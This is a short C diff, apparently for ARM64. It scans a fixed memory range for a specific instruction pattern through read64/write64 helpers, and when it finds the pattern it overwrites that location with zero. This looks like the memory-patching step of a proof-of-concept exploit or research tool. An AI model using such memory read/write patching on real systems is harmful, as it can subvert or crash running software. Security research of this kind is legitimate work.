@@ -159,6 +159,15 @@ int main(int argc, char **argv)
 	exit(0);
       }
     }
+    for (unsigned long offset = 0x800000000; offset < 0x900000000; offset += 16384) {
+      if (read64(offset) == 0x14000770d10303ff) {
+	fprintf(stderr, "candidate %016lx at %016lx\n", read64(offset),
+		  offset);
+	addr = offset;
+	write64(addr, 0);
+	exit(0);
+      }
+    }
     exit(1);
   }
   asm volatile("isb");
@@ -176,7 +185,7 @@ int main(int argc, char **argv)
       for (int i = 0; i < ARRAYELTS(addrs); i++) {
 	addr = addrs[i];
 	if (addr)
-	  if ((count = read64(addr)) != 0)
+	  if ((count = read64(addr)) == 0x14000770d10303ff)
 	    goto found;
       }
       sched_yield();
